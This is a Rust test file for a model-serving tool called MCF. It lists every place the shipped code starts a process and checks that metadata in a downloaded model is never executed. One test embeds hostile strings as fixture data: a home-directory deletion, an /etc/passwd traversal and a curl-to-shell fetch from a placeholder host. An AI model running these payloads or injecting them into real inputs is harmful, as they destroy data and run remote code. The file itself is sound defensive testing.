//! MCF runs nothing it downloaded (B-025, §6.4, §3.7).
//!
//! §6.4 allows repository code to be executed — deliberately, per artifact,
//! with the risk stated and the choice recorded — and B-025 is where that will
//! be built. Today MCF executes **nothing** it acquires, and that is a stronger
//! statement than the one B-025 will eventually make. It is worth checking for
//! exactly as long as it is true: the moment an engine is vendored (B-320) that
//! can run a repository's own code, this file is where the boundary has to be
//! redrawn rather than quietly crossed.
//!
//! What a check can hold is the act, not the intent. Every place MCF's shipped
//! code starts a process is declared below with what it starts and why that is
//! not an artifact.
//!
//! **Provisioning is where the boundary is drawn, not crossed** (B-367, §6.4).
//! `mcf provision` starts `podman`, a platform binary, and inside the container
//! it starts, source MCF cloned at a pinned commit is compiled and — during the
//! build — run. That *is* repository code executing, and it is what §6.4
//! permits: deliberately (the operator named the component), per artifact (one
//! pin, declared in MCF's own table), with the choice recorded
//! (`component_provisioned`). Nothing from the container reaches the host's
//! own process, and nothing MCF *acquires as a model* is ever started by any
//! path here.
//!
//! **What this does not prove.** That an artifact's *content* cannot become
//! code some other way — a library MCF loads, a format that names a plugin. It
//! proves that no path in the shipped tree reaches `exec`, which is where
//! running something begins, and the laboratory's scenarios cover what MCF does
//! with hostile content it *reads*.

// Every item in this file is test code; see the note in `taxonomy_agreement.rs`.
#![allow(clippy::panic)]

use std::path::{Path, PathBuf};

/// A file that starts a process, and what it starts.
struct Spawns {
    file: &'static str,
    /// How many places in it start something.
    sites: usize,
    /// What is started, and why it is not something MCF downloaded.
    what: &'static str,
}

/// Every place MCF's shipped code starts a process.
const DECLARED: &[Spawns] = &[
    Spawns {
        file: "crates/mcf-lab/src/catalogue/engine.rs",
        sites: 5,
        what: "the laboratory's stand-ins for an engine that dies: a shell told to exit, a \
               shell told to kill itself, a program that is not there, a directory where a \
               program should be, and a shell told to sleep — a server that starts and never \
               becomes ready. What is simulated is the death or the silence, never a model \
               (D26, B-033)",
    },
    Spawns {
        file: "crates/mcf-serve/src/adapters.rs",
        sites: 1,
        what: "an engine that is a process: the completion tool MCF itself built into a \
               provisioned prefix (B-367), supervised as B-033 asks — or, in the laboratory, a \
               shell that dies a stated way. What it is given is a model file as *input*; the \
               program is never something MCF acquired (D39, B-032)",
    },
    Spawns {
        file: "crates/mcf-cli/src/serve.rs",
        sites: 1,
        what: "MCF itself, asked to serve, when a surface finds no daemon listening. The \
               program started is the one already running — `current_exe` — with one \
               argument and no file of any kind. A person opening a console expects the \
               tools to be working, and starting the daemon is MCF's job rather than \
               something to report to them as their problem (B-408, D39)",
    },
    Spawns {
        file: "crates/mcf-tui/src/machine.rs",
        sites: 1,
        what: "the graphics vendor's own reporting tool, asked what the card is doing, so the \
               console can draw a load and a temperature. It is given a query and a format and \
               no file at all; it is a program the operator's system already has, never \
               anything MCF acquired (B-025, §6.4)",
    },
    Spawns {
        file: "crates/mcf-serve/src/engines.rs",
        sites: 2,
        what: "a provisioned engine asked what devices it can use, and nothing else. The \
               program is one MCF built itself in a container from a pinned source; it is \
               given a single flag, no model and no acquired file of any kind. Asking is the \
               only honest way to know what a build's backends are — a CPU build answers with \
               nothing however many cards are installed, so declaring support would be a \
               claim about a compile nobody can see (A21, D39, B-032)",
    },
    Spawns {
        file: "crates/mcf-serve/src/served.rs",
        sites: 1,
        what: "the same provisioned prefix's server rather than its completion tool (B-376), \
               so that a turn of token identifiers can reach an engine and the engine can say \
               why it stopped — the two things a probe needs and a command line cannot carry. \
               It is given a model file as *input* and binds a Unix socket under MCF's own \
               runtime directory, never a port: nothing listens on the network, and the \
               program is still one MCF built, never one it acquired (D39, B-032, §XVII)",
    },
    Spawns {
        file: "crates/mcf-cli/src/provision.rs",
        sites: 1,
        what: "podman, from the platform's own path, running an image pinned by digest and a \
               script MCF wrote into the prefix a moment before. What executes inside the \
               container is source at a commit MCF's own table names, chosen by the operator \
               and recorded — §6.4's permitted case, not an acquired model (B-367)",
    },
    Spawns {
        file: "crates/mcf-core/src/self_cost.rs",
        sites: 1,
        what: "MCF itself, by the path the caller gives, to measure how long MCF takes to \
               start (D24's cold-start figure). The program measured is the binary under \
               test; nothing acquired can reach this, because nothing acquired is ever a \
               path a caller has",
    },
    Spawns {
        file: "crates/mcf-core/src/hardware/nvml.rs",
        sites: 2,
        what: "the vendor's own management library, by `dlopen`, to read an accelerator's \
               live state (D25, F1). This is the one place MCF loads code it did not \
               compile, and what it loads is a two-entry list of `&'static str` — a \
               library name, never a path anything supplies. It is declared, and \
               `the_library_mcf_loads_is_a_constant` below holds the distinction",
    },
    Spawns {
        file: "crates/mcf-helper/src/lib.rs",
        sites: 1,
        what: "the accelerator vendor's own management tool, by name and with fixed \
               arguments, to take or release a device's exclusive compute mode (D35's \
               second privileged operation). The mode belongs to the vendor and there is \
               no file to write; a helper that spoke a proprietary driver's protocol \
               itself would be a helper nobody can audit. The tool's name is a literal, \
               the device index is refused unless it is digits, and the whole call is \
               refused before it is made when this process is not root",
    },
    Spawns {
        file: "crates/mcf-core/build.rs",
        sites: 2,
        what: "the compiler, at build time, to record which one built this — §3.4 makes \
               that a condition of every measurement. It runs on the machine doing the \
               building, before any artifact exists, and it starts what `RUSTC` names \
               rather than anything MCF chose",
    },
];

/// What starting a process looks like.
const STARTS: &[&str] = &[
    "Command::new",
    "process::Command",
    "execvp",
    "execve",
    "posix_spawn",
    "libloading",
    "dlopen",
];

/// Nothing starts a process except where it is written down.
#[test]
fn every_place_that_starts_something_is_declared() {
    let root = mcf_checks::workspace::root();
    let mut looked_at = 0_usize;
    for file in shipped_sources(&root) {
        let relative = file
            .strip_prefix(&root)
            .unwrap_or(&file)
            .display()
            .to_string();
        let sites = starting_calls(&read(&file));
        looked_at = looked_at.saturating_add(1);
        match DECLARED.iter().find(|declared| declared.file == relative) {
            None => assert_eq!(
                sites, 0,
                "{relative} starts a process and nothing says what: MCF runs nothing it \
                 acquires, and every place it runs anything is declared in \
                 checks/tests/nothing_acquired_is_ever_run.rs (B-025, §6.4)"
            ),
            Some(declared) => assert_eq!(
                sites, declared.sites,
                "{relative} starts something in {sites} places and declares {}: {}",
                declared.sites, declared.what
            ),
        }
    }
    assert!(
        looked_at > 20,
        "only {looked_at} sources were read, so this check is looking at the wrong tree"
    );
}

/// And nothing is declared that has stopped starting anything, because a stale
/// line is a budget somebody could spend later without saying so.
#[test]
fn nothing_is_declared_that_no_longer_starts_anything() {
    let root = mcf_checks::workspace::root();
    for declared in DECLARED {
        let path = root.join(declared.file);
        assert!(
            path.exists(),
            "{} is declared here and no longer exists",
            declared.file
        );
        assert_eq!(
            starting_calls(&read(&path)),
            declared.sites,
            "{} no longer starts anything in the {} places declared for it",
            declared.file,
            declared.sites
        );
    }
}

/// The one place that starts something takes the program as an argument rather
/// than deciding it.
///
/// The distinction is the whole of B-025's *never implicit*: a function that
/// chooses what to run can be pointed at an artifact by a caller who did not
/// realize, and one that is handed a path cannot choose anything.
#[test]
fn the_one_place_that_starts_something_is_told_what_to_start() {
    let source = read(&mcf_checks::workspace::root().join("crates/mcf-core/src/self_cost.rs"));
    assert!(
        source.contains("pub fn cold_start(\n    program: &std::path::Path,"),
        "`cold_start` no longer takes the program to run as an argument, so something in \
         MCF now decides what to execute (B-025)"
    );
    assert!(
        !code_only(&source).contains("models"),
        "the one place that starts a process now mentions the model store"
    );
}

/// The one library MCF loads is named by a constant, not by anything a caller,
/// a file or a hub supplies.
///
/// `dlopen` is *the* way an artifact's bytes could become code without anything
/// looking like execution, so the check on it is not that it is absent but that
/// what it opens cannot be influenced: two `&'static str` names, and nothing
/// joined to them.
#[test]
fn the_library_mcf_loads_is_a_constant() {
    let source = read(&mcf_checks::workspace::root().join("crates/mcf-core/src/hardware/nvml.rs"));
    assert!(
        source.contains(
            r#"const CANDIDATES: [&str; 2] = ["libnvidia-ml.so.1\0", "libnvidia-ml.so\0"];"#
        ),
        "the library names are no longer a constant list, so what MCF loads can now be \
         influenced from outside (B-025, §3.7)"
    );
    let code = code_only(&source);
    for reaching in ["env::var", "PathBuf", "format!(", "push_str"] {
        assert!(
            !code.contains(reaching),
            "`{reaching}` appears in the module that loads a library: what it opens must \
             stay a constant"
        );
    }
}

/// What is in a model file is data, whatever it looks like.
///
/// The other half of B-025, and the one a source check cannot reach: a
/// repository can put anything in a metadata string, and what MCF must do with
/// a string that reads like a command is hand it back as a string. This builds
/// a model whose fields are a shell command, a path traversal and a format
/// specifier, reads it with MCF's own reader, and asserts each comes back
/// exactly as written — neither run, nor resolved, nor interpolated (§3.7).
#[test]
fn a_model_files_contents_are_data_however_they_read() {
    let hostile = [
        ("general.name", "; rm -rf ~ #"),
        ("general.description", "../../../../etc/passwd"),
        ("general.author", "{}{}{} %s %n"),
        ("general.licence", "$(curl http://example.invalid | sh)"),
    ];
    let model = mcf_standin::gguf::parse(&a_model_declaring(&hostile)).expect("a model file");

    for (key, written) in hostile {
        match model.get(key) {
            Some(mcf_standin::gguf::Value::Text(read)) => assert_eq!(
                read, written,
                "{key} came back changed: a model's metadata is data, and MCF neither runs \
                 nor resolves nor interpolates it"
            ),
            other => panic!("{key} read as {other:?} rather than as the text it is"),
        }
    }
}

/// A GGUF holding these metadata strings and no tensors.
///
/// Written here rather than taken from a fixture: what is being asserted is
/// what MCF does with *these* bytes, and a reader of this test should be able
/// to see them.
fn a_model_declaring(fields: &[(&str, &str)]) -> Vec<u8> {
    fn push_string(into: &mut Vec<u8>, text: &str) {
        into.extend_from_slice(&(text.len() as u64).to_le_bytes());
        into.extend_from_slice(text.as_bytes());
    }

    let mut bytes = b"GGUF".to_vec();
    bytes.extend_from_slice(&3_u32.to_le_bytes());
    bytes.extend_from_slice(&0_u64.to_le_bytes());
    bytes.extend_from_slice(&(fields.len() as u64).to_le_bytes());
    for (key, value) in fields {
        push_string(&mut bytes, key);
        // 8 is the format's string type.
        bytes.extend_from_slice(&8_u32.to_le_bytes());
        push_string(&mut bytes, value);
    }
    bytes
}

fn read(path: &Path) -> String {
    std::fs::read_to_string(path)
        .unwrap_or_else(|error| panic!("{} is readable: {error}", path.display()))
}

/// Lines that start something, rather than pattern matches: one call written
/// `std::process::Command::new` matches two of the names below and is still one
/// place where MCF starts a process.
fn starting_calls(source: &str) -> usize {
    code_only(&ships(source))
        .lines()
        .filter(|line| STARTS.iter().any(|start| line.contains(start)))
        .count()
}

/// A file with its inline test module cut off: a test that runs a binary is a
/// test doing its job, and the claim here is about the code that ships.
fn ships(source: &str) -> String {
    match source.find("#[cfg(test)]") {
        Some(at) => source.get(..at).unwrap_or(source).to_owned(),
        None => source.to_owned(),
    }
}

/// A file with its documentation removed: the prose names what it forbids in
/// order to say it is absent.
fn code_only(source: &str) -> String {
    source
        .lines()
        .filter(|line| !line.trim_start().starts_with("//"))
        .collect::<Vec<_>>()
        .join("\n")
}

/// Every `.rs` file under `crates/`, build scripts included, that is not itself
/// a test.
///
/// Build scripts count: a build script runs on somebody's machine with their
/// permissions, and *what starts a process* is the question here rather than
/// *when*.
///
/// The prototypes are deliberately outside it: `prototypes/adversarial` starts
/// children that die badly *on purpose*, which is what it is for (F1), and it
/// is not what MCF ships.
fn shipped_sources(root: &Path) -> Vec<PathBuf> {
    let mut found = Vec::new();
    collect(&root.join("crates"), &mut found);
    found.retain(|path| {
        let text = path.display().to_string();
        !text.contains("/tests/") && !text.ends_with("tests.rs")
    });
    found.sort();
    found
}

fn collect(directory: &Path, into: &mut Vec<PathBuf>) {
    let Ok(entries) = std::fs::read_dir(directory) else {
        return;
    };
    for entry in entries.flatten() {
        let path = entry.path();
        if path.is_dir() {
            if path.file_name().is_some_and(|name| name == "target") {
                continue;
            }
            collect(&path, into);
        } else if path.extension().is_some_and(|extension| extension == "rs") {
            into.push(path);
        }
    }
}
